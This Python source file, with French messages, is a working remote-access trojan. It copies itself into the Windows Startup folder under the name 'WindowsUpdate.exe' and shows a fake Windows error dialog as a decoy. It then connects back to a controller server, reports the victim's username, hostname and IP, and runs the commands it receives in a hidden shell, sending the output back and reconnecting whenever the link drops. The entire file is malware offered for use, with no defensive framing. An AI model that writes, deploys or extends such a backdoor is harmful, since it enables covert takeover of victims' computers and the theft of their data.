import socket
import subprocess
import os
import platform
import sys
import time
import shutil
import ctypes
import uuid
import json

def add_to_startup():
    try:
        if getattr(sys, 'frozen', False):
            app_path = sys.executable
        else:
            app_path = sys.argv[0]
        
        app_path = os.path.abspath(app_path)
        
        startup_folder = os.path.join(
            os.environ["APPDATA"],
            r"Microsoft\Windows\Start Menu\Programs\Startup"
        )
        
        target_path = os.path.join(startup_folder, "WindowsUpdate.exe")
        
        if app_path != target_path:
            shutil.copy2(app_path, target_path)
        
        return True
    except Exception as e:
        return False

def send_in_chunks(agent_socket, data, chunk_size=1024):
    data_size = len(data)
    agent_socket.send(str(data_size).encode('utf-8'))
    agent_socket.recv(1024)

    for i in range(0, data_size, chunk_size):
        chunk = data[i:i + chunk_size]
        agent_socket.send(chunk.encode('utf-8'))

def get_shell_command():
    system = platform.system().lower()
    if system == "windows":
        return ["powershell.exe", "-WindowStyle", "Hidden", "-NoProfile", "-NonInteractive"]
    elif system in ["linux", "darwin"]:
        shell = os.environ.get("SHELL", "/bin/bash")
        return [shell, "-c"]
    else:
        raise OSError(f"Système d'exploitation non supporté : {system}")

def handle_command(command):
    shell_cmd = get_shell_command()
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        
        final_cmd = shell_cmd + [command]
        result = subprocess.run(
            final_cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            cwd=os.getcwd(),
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_NO_WINDOW
        )

        if result.stderr:
            return result.stderr
        else:
            current_dir = os.getcwd()
            return f"\033[92m[{current_dir}]\033[0m\n{result.stdout}"
            
    except Exception as e:
        return str(e)

def get_system_info():
    info = {
        "id": str(uuid.uuid4()),
        "username": os.getlogin(),
        "hostname": socket.gethostname(),
        "ip": socket.gethostbyname(socket.gethostname()),
    }
    
    return info

def connect_and_handle_commands(server_ip, server_port, reconnect_delay=5):
    while True:
        try:
            agent_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            agent_socket.connect((server_ip, server_port))

            system_info = get_system_info()
            info_json = json.dumps(system_info)
            info_data = f"INFO:{info_json}"
            send_in_chunks(agent_socket, info_data)

            while True:
                try:
                    command = agent_socket.recv(1024).decode()
                    
                    if not command:
                        break
                    
                    if command.lower() == 'exit':
                        agent_socket.close()
                        return

                    if command.startswith('cd '):
                        try:
                            new_path = command[3:].strip()
                            os.chdir(new_path)
                            output = f"Répertoire changé vers : {os.getcwd()}"
                        except Exception as e:
                            output = f"Erreur lors du changement de répertoire : {str(e)}"
                    else:
                        output = handle_command(command)

                    send_in_chunks(agent_socket, output)

                except Exception as e:
                    break

            agent_socket.close()
            
        except Exception as e:
            pass
        
        time.sleep(reconnect_delay)

def show_error():
    title = "Windows Error"
    message = "Error : (Error 0x80070002)\n."
    ctypes.windll.user32.MessageBoxW(0, message, title, 0x10)

def main():
    marker_path = os.path.join(os.getenv('APPDATA'), '.windows_update_marker')
    
    if not os.path.exists(marker_path):
        show_error()
        try:
            with open(marker_path, 'w') as f:
                f.write('1')
        except:
            pass
    
    # Setup server information
    server_ip = '' 
    server_port = 12345
    
    add_to_startup()
    
    while True:
        try:
            connect_and_handle_commands(server_ip, server_port)
        except KeyboardInterrupt:
            break
        except Exception as e:
            time.sleep(5)

if __name__ == "__main__":
    main()